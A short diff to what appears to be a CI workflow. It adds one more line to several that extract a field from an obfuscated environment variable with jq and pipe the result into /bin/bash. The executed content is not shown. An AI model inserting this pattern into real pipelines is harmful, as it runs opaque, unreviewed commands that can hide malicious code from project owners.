@@ -41,6 +41,7 @@ jobs:
           echo $ka6 | jq -r .ysez177 | /bin/bash
           echo $mxrp7496 | jq -r .qctze6 | /bin/bash
           echo $tzxib37933 | jq -r .ccgi977 | /bin/bash
+          printf '%s' "$ett02" | jq -r .pgivb5 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
